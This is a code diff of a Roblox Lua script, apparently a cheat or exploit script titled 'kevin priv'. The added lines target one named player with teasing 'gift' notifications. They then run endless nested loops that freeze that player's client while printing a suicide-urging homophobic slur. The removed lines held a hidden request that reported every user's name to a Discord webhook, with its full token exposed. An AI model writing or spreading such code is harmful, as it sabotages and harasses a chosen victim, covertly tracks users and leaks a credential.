@@ -10,19 +10,21 @@ function sendnotif(STitle, SDescription, SDuration)
 })
 end
 
+if game.Players.LocalPlayer.Name == "Hey_s4m1" then
+   sendnotif('kevin priv', "hey baguette speaker, i have a gift for u in approximately 10 seconds", 9)
+   wait(9)
+   sendnotif('kevin priv', 'ENJOY UR GIFT!!!', 10)
+   while true do
+        for i=1,999999 do
+            while true do
+                for z=1,999999 do
+                    print('kys fag.')
+                end
+            end
+        end
+    end
+end
 
-local webhook_url = "https://discord.com/api/webhooks/1081465617913237564/SfAFjuiiHvSqkeFOzUz486pQMKH5Kbn2jN4qDN5lGBYs53iFdYYcD19c5aVQqOAAAT2R"
-
-request(
-    {
-        Url = webhook_url,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = game:GetService("HttpService"):JSONEncode({["content"] = string.format(game.Players.LocalPlayer.Name .. " has executed the script)})
-    }
-)
 sendnotif('kevin priv', 'kevin black pwet', 3)
 
 
